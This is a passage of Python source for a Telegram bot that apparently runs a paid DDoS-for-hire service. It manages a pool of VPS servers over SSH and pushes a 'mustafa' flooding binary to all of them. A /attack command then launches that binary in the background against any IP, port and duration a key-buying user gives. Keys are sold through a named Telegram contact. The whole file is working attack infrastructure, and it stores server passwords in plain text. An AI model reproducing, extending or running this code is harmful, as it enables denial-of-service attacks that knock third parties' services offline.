                results.append(f"✅ {vps['ip']}: OK (Binary found)")
                vps['status'] = 'active'
                active += 1
            else:
                results.append(f"⚠️ {vps['ip']}: Connected but no binary")
                vps['status'] = 'no_binary'
                
        except Exception as e:
            results.append(f"❌ {vps['ip']}: Failed - {str(e)[:30]}")
            vps['status'] = 'dead'
    
    save_data()
    
    result_text = "📊 TEST RESULTS\n\n"
    for res in results[:15]:  # Show first 15
        result_text += res + "\n"
    
    if len(results) > 15:
        result_text += f"... and {len(results)-15} more\n"
    
    result_text += f"\n✅ Active: {active}/{len(vps_servers)}"
    
    await msg.edit_text(result_text)

async def upload_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin only command!")
        return
    
    if not vps_servers:
        await update.message.reply_text("❌ No VPS servers!")
        return
    
    upload_session[user_id] = {'step': 'waiting'}
    
    await update.message.reply_text(
        "📤 UPLOAD BINARY\n\n"
        "Please send the 'mustafa' binary file.\n"
        "The file should be named exactly 'mustafa'"
    )

# ==================== ATTACK COMMANDS ====================
async def attack_vps(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_attack_running, current_attack_id, current_attack_end_time
    
    user_id = update.effective_user.id
    
    if not is_approved(user_id) and not is_admin(user_id):
        await update.message.reply_text("❌ You are not authorized!")
        return
    
    if is_attack_running:
        remaining = int(current_attack_end_time - time.time())
        await update.message.reply_text(
            f"❌ ANOTHER ATTACK IS ALREADY RUNNING!\n\n⏱️ Time left: {remaining}s\n🆔 ID: {current_attack_id}"
        )
        return
    
    # Check user cooldown
    cooldown_remaining = check_user_cooldown(user_id)
    if cooldown_remaining > 0:
        await update.message.reply_text(
            f"⏱️ You are in cooldown! Please wait {cooldown_remaining}s before your next attack."
        )
        return
    
    if len(context.args) != 3:
        await update.message.reply_text("❌ Usage: /attack <ip> <port> <time>\n\nExample: /attack 1.1.1.1 80 60")
        return
    
    target_ip, port, duration = context.args
    
    try:
        port = int(port)
        duration = int(duration)
        if duration > max_attack_duration and not is_admin(user_id):
            await update.message.reply_text(f"❌ Max time is {max_attack_duration}s!")
            return
        if duration < 1:
            await update.message.reply_text("❌ Time must be > 0!")
            return
        if port < 1 or port > 65535:
            await update.message.reply_text("❌ Port must be between 1-65535!")
            return
    except:
        await update.message.reply_text("❌ Invalid port or time!")
        return
    
    if not vps_servers:
        await update.message.reply_text("❌ No VPS servers!")
        return
    
    active_vps = [vps for vps in vps_servers if vps.get('status') == 'active']
    
    if not active_vps:
        await update.message.reply_text("❌ No active VPS! Admin needs to run /test_vps first")
        return
    
    msg = await update.message.reply_text(
        f"🚀 LAUNCHING ATTACK!\n\n"
        f"🎯 Target: {target_ip}:{port}\n"
        f"⏱️ Time: {duration}s\n"
        f"🖥️ Using {len(active_vps)} active VPS\n"
        f"⚡ Threads per VPS: {attack_threads}"
    )
    
    # Update user's cooldown
    update_user_cooldown(user_id)
    
    is_attack_running = True
    current_attack_id = f"ATTACK-{int(time.time())}"
    current_attack_end_time = time.time() + duration
    
    asyncio.create_task(run_massive_attack(update, context, active_vps, target_ip, port, duration, msg, user_id))

async def attack_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_approved(user_id) and not is_admin(user_id):
        await update.message.reply_text("❌ You are not authorized!")
        return
    
    if is_attack_running and current_attack_end_time:
        remaining = int(current_attack_end_time - time.time())
        status = f"🔴 ATTACK RUNNING ({remaining}s left)"
        status += f"\n🆔 ID: {current_attack_id}"
    else:
        status = "🟢 READY"
    
    # Check user's personal cooldown
    cooldown_remaining = check_user_cooldown(user_id)
    if cooldown_remaining > 0 and not is_admin(user_id):
        status += f"\n⏱️ Your cooldown: {cooldown_remaining}s"
    
    await update.message.reply_text(f"📊 ATTACK STATUS\n\n{status}")

async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """User-friendly stats - NO VPS INFO"""
    user_id = update.effective_user.id
    
    if not is_approved(user_id) and not is_admin(user_id):
        await update.message.reply_text("❌ You are not authorized!")
        return
    
    if is_admin(user_id):
        # Admin sees all stats
        active = sum(1 for v in vps_servers if v.get('status') == 'active')
        total = len(vps_servers)
        total_attacks = sum(v.get('attack_count', 0) for v in vps_servers)
        
        await update.message.reply_text(
            f"📊 ADMIN STATS\n\n"
            f"⚙️ CONFIG:\n"
            f"• Max Time: {max_attack_duration}s\n"
            f"• Cooldown: {attack_cooldown}s\n"
            f"• Threads: {attack_threads}\n\n"
            f"🖥️ VPS:\n"
            f"• Total: {total}\n"
            f"• Active: {active}\n"
            f"• Total Attacks: {total_attacks}\n\n"
            f"👥 Users: {len(approved_users)}\n"
            f"🔑 Keys: {len(generated_keys)}"
        )
    else:
        # User sees only basic info
        cooldown_remaining = check_user_cooldown(user_id)
        cooldown_text = f"{cooldown_remaining}s" if cooldown_remaining > 0 else "Ready"
        
        await update.message.reply_text(
            f"📊 YOUR STATS\n\n"
            f"⚙️ CONFIGURATION:\n"
            f"• Max Attack Time: {max_attack_duration}s\n"
            f"• Global Cooldown: {attack_cooldown}s\n"
            f"• Your Status: {cooldown_text}\n\n"
            f"📝 Use /attack to start an attack"
        )

# ==================== ATTACK FUNCTION ====================
async def run_massive_attack(update, context, vps_list, target_ip, port, duration, msg, user_id):
    global is_attack_running
    
    successful = 0
    failed = 0
    
    def attack_single_vps(vps):
        nonlocal successful, failed
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            if vps.get('auth_type') == 'pem':
                client.connect(vps['ip'], port=vps['port'], username=vps['username'], 
                             key_filename=vps['pem_path'], timeout=10, allow_agent=False, look_for_keys=False)
            else:
                client.connect(vps['ip'], port=vps['port'], username=vps['username'], 
                             password=vps.get('password', ''), timeout=10, allow_agent=False, look_for_keys=False)
            
            # Kill any existing mustafa processes
            client.exec_command("pkill -f mustafa")
            time.sleep(1)
            
            # Start attack
            cmd = f"cd ~ && nohup ./mustafa {target_ip} {port} {duration} {attack_threads} > /dev/null 2>&1 &"
            client.exec_command(cmd)
            client.close()
            
            vps['attack_count'] = vps.get('attack_count', 0) + 1
            vps['last_used'] = time.time()
            successful += 1
            
        except Exception as e:
            failed += 1
            vps['status'] = 'dead'  # Mark as dead if connection fails
    
    await msg.edit_text(
        f"🚀 ATTACK IN PROGRESS\n\n"
        f"🎯 {target_ip}:{port}\n"
        f"⏱️ {duration}s\n"
        f"🖥️ Launching on {len(vps_list)} VPS..."
    )
    
    # Use threading for parallel execution
    threads = []
    for vps in vps_list:
        thread = threading.Thread(target=attack_single_vps, args=(vps,))
        thread.start()
        threads.append(thread)
        time.sleep(0.2)  # Small delay to avoid overwhelming
    
    for thread in threads:
        thread.join()
    
    save_data()
    
    result_text = f"✅ ATTACK LAUNCHED!\n\n"
    result_text += f"🎯 {target_ip}:{port}\n"
    result_text += f"⏱️ {duration}s\n"
    result_text += f"✅ Success: {successful}\n"
    result_text += f"❌ Failed: {failed}\n"
    result_text += f"⚡ Threads per VPS: {attack_threads}\n\n"
    result_text += f"⏱️ Running for {duration}s..."
    
    await msg.edit_text(result_text)
    
    # Wait for attack duration
    await asyncio.sleep(duration)
    
    is_attack_running = False
    
    await context.bot.send_message(
        chat_id=update.effective_user.id,
        text=f"✅ ATTACK COMPLETED!\n\n🎯 {target_ip}:{port}\n⏱️ Duration: {duration}s"
    )

# ==================== MESSAGE HANDLERS ====================
async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        return
    
    document = update.message.document
    
    # Handle binary upload
    if user_id in upload_session:
        if document.file_name == "mustafa":
            msg = await update.message.reply_text("📥 Downloading binary...")
            
            file = await context.bot.get_file(document.file_id)
            await file.download_to_drive("mustafa")
            os.chmod("mustafa", 0o755)
            
            await msg.edit_text("✅ Downloaded! Uploading to all VPS...")
            
            successful = 0
            failed = 0
            
            for vps in vps_servers:
                try:
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    
                    if vps.get('auth_type') == 'pem':
                        client.connect(vps['ip'], port=vps['port'], username=vps['username'], 
                                     key_filename=vps['pem_path'], timeout=10, allow_agent=False, look_for_keys=False)
                    else:
                        client.connect(vps['ip'], port=vps['port'], username=vps['username'], 
                                     password=vps.get('password', ''), timeout=10, allow_agent=False, look_for_keys=False)
                    
                    sftp = client.open_sftp()
                    sftp.put("mustafa", "mustafa")
                    sftp.close()
                    
                    client.exec_command("chmod +x mustafa")
                    client.close()
                    
                    vps['status'] = 'active'
                    successful += 1
                    
                except Exception as e:
                    failed += 1
                    vps['status'] = 'dead'
            
            save_data()
            
            # Clean up
            if os.path.exists("mustafa"):
                os.remove("mustafa")
            
            del upload_session[user_id]
            
            await update.message.reply_text(
                f"📤 UPLOAD COMPLETE\n\n"
                f"✅ Success: {successful}\n"
                f"❌ Failed: {failed}"
            )
        else:
            await update.message.reply_text("❌ File must be named 'mustafa'")
        return
    
    # Handle PEM file upload for AWS VPS
    if user_id in user_sessions and user_sessions[user_id].get('step') == 'pem_path':
        if not document.file_name.endswith('.pem'):
            await update.message.reply_text("❌ Please send a .pem file!")
            return
        
        session = user_sessions[user_id]
        
        # Create pem_files directory if it doesn't exist
        if not os.path.exists('pem_files'):
            os.makedirs('pem_files')
        
        pem_path = f"pem_files/{session['ip']}.pem"
        file = await context.bot.get_file(document.file_id)
        await file.download_to_drive(pem_path)
        os.chmod(pem_path, 0o400)  # Secure permissions
        
        msg = await update.message.reply_text("🔌 Testing connection...")
        
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(session['ip'], port=session['port'], username=session['username'], 
                         key_filename=pem_path, timeout=10, allow_agent=False, look_for_keys=False)
            client.close()
            
            vps_servers.append({
                'ip': session['ip'],
                'port': session['port'],
                'username': session['username'],
                'auth_type': 'pem',
                'password': None,
                'pem_path': pem_path,
                'status': 'active',
                'added_at': time.time(),
                'last_used': None,
                'attack_count': 0
            })
            save_data()
            
            await msg.edit_text(f"✅ AWS VPS ADDED!\n\nIP: {session['ip']}\nUser: {session['username']}")
            del user_sessions[user_id]
            
        except Exception as e:
            await msg.edit_text(f"❌ Connection failed: {str(e)}")
            if os.path.exists(pem_path):
                os.remove(pem_path)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_admin(user_id) or user_id not in user_sessions:
        return
    
    session = user_sessions[user_id]
    text = update.message.text
    
    # Direct VPS addition flow
    if session['type'] == 'direct':
        if session['step'] == 'ip':
            session['ip'] = text
            session['step'] = 'port'
            await update.message.reply_text("✅ IP saved!\n\nEnter SSH Port (e.g., 22):")
        
        elif session['step'] == 'port':
            try:
                port = int(text)
                if port < 1 or port > 65535:
                    await update.message.reply_text("❌ Port must be between 1-65535!")
                    return
                session['port'] = port
                session['step'] = 'username'
                await update.message.reply_text("✅ Port saved!\n\nEnter Username (root/ubuntu):")
            except:
                await update.message.reply_text("❌ Invalid port! Enter a number:")
        
        elif session['step'] == 'username':
            session['username'] = text
            session['step'] = 'password'
            await update.message.reply_text("✅ Username saved!\n\nEnter Password:")
        
        elif session['step'] == 'password':
            session['password'] = text
            
            msg = await update.message.reply_text("🔌 Testing connection...")
            
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(session['ip'], port=session['port'], username=session['username'], 
                             password=session['password'], timeout=10, allow_agent=False, look_for_keys=False)
                client.close()
                
                vps_servers.append({
                    'ip': session['ip'],
                    'port': session['port'],
                    'username': session['username'],
                    'auth_type': 'password',
                    'password': session['password'],
                    'pem_path': None,
                    'status': 'active',
                    'added_at': time.time(),
                    'last_used': None,
                    'attack_count': 0
                })
                save_data()
                
                await msg.edit_text(f"✅ VPS ADDED!\n\nIP: {session['ip']}")
                del user_sessions[user_id]
                
            except Exception as e:
                await msg.edit_text(f"❌ Connection failed: {str(e)}")
    
    # AWS VPS addition flow
    elif session['type'] == 'aws':
        if session['step'] == 'ip':
            session['ip'] = text
            session['step'] = 'port'
            await update.message.reply_text("✅ IP saved!\n\nEnter SSH Port (e.g., 22):")
        
        elif session['step'] == 'port':
            try:
                port = int(text)
                if port < 1 or port > 65535:
                    await update.message.reply_text("❌ Port must be between 1-65535!")
                    return
                session['port'] = port
                session['step'] = 'username'
                await update.message.reply_text("✅ Port saved!\n\nEnter Username (ubuntu/ec2-user):")
            except:
                await update.message.reply_text("❌ Invalid port! Enter a number:")
        
        elif session['step'] == 'username':
            session['username'] = text
            session['step'] = 'pem_path'
            await update.message.reply_text("✅ Username saved!\n\nNow send the .pem file.")

# ==================== CALLBACK HANDLERS ====================
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    data = query.data
    
    # Handle redeem menu for unauthorized users
    if data == "redeem_menu":
        await query.edit_message_text(
            "🔑 REDEEM KEY\n\n"
            "To get access, you need a valid key.\n\n"
            "Use the command:\n"
            "/redeem YOUR_KEY_HERE\n\n"
            "Example: /redeem VIP-ABCD1234\n\n"
            "Contact @SIDIKI_MUSTAFA_92 to purchase a key."
        )
        return
    
    # Rest is admin only
    if not is_admin(user_id):
        await query.edit_message_text("❌ Unauthorized!")
        return
    
    if data == "add_direct_vps":
        user_sessions[user_id] = {'type': 'direct', 'step': 'ip'}
        await query.edit_message_text(
            "📝 ADD DIRECT VPS\n\n"
            "Step 1/4: Enter VPS IP Address:\n"
            "Example: 192.168.1.1"
        )
    
    elif data == "add_aws_vps":
        user_sessions[user_id] = {'type': 'aws', 'step': 'ip'}
        await query.edit_message_text(
            "📝 ADD AWS VPS\n\n"
            "Step 1/4: Enter VPS IP Address:\n"
            "Example: 54.123.45.67"
        )

# ==================== MAIN ====================
def main():
    global start_time
    start_time = time.time()
    
    # Clear screen
    os.system('clear' if os.name == 'posix' else 'cls')
    
    print(f"{P}{BANNER}{R}")
    print(f"{G}✅ VPS: {len(vps_servers)}")
    print(f"{G}✅ Users: {len(approved_users)}")
    print(f"{Y}✅ Keys: {len(generated_keys)}")
    print(f"{Y}✅ Redeems: {len(redeem_log)}")
    print(f"{C}✅ Cooldown: {attack_cooldown}s (per user){R}")
    print(f"{C}✅ Bot starting...{R}")
    
    # Create necessary directories
    if not os.path.exists('pem_files'):
        os.makedirs('pem_files')
    
    app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
    
    # Admin commands
    app.add_handler(CommandHandler("add_vps", add_vps_command))
    app.add_handler(CommandHandler("remove_vps", remove_vps))
    app.add_handler(CommandHandler("list_vps", list_vps))
    app.add_handler(CommandHandler("test_vps", test_vps))
    app.add_handler(CommandHandler("upload", upload_command))
    app.add_handler(CommandHandler("vps_stats", vps_stats))
    app.add_handler(CommandHandler("cooldown_status", cooldown_status))
    
    # Key management commands
    app.add_handler(CommandHandler("gen", gen_key))
    app.add_handler(CommandHandler("redeem", redeem_key))
    app.add_handler(CommandHandler("list_key", list_keys))
    app.add_handler(CommandHandler("delete_key", delete_key))
    app.add_handler(CommandHandler("key_stats", key_stats))
    
    # User approval commands
    app.add_handler(CommandHandler("approve", approve_user))
    app.add_handler(CommandHandler("disapprove", disapprove_user))
    app.add_handler(CommandHandler("list_approved", list_approved))
    app.add_handler(CommandHandler("broadcast", broadcast))
    
    # Configuration commands
    app.add_handler(CommandHandler("set_cooldown", set_cooldown))
    app.add_handler(CommandHandler("setmax_duration", set_max_duration))
    app.add_handler(CommandHandler("set_threads", set_threads))
    
    # User commands
    app.add_handler(CommandHandler("attack", attack_vps))
    app.add_handler(CommandHandler("status", attack_status))
    app.add_handler(CommandHandler("stats", stats))
    app.add_handler(CommandHandler("mycooldown", mycooldown))
    
    # Public commands
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", start))
    
    # Handlers
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    print(f"{G}✅ Bot running with PER-USER COOLDOWN system!{R}")
    print(f"{C}📱 Telegram: @SIDIKI_MUSTAFA_92{R}")
    app.run_polling()

if __name__ == "__main__":
    main()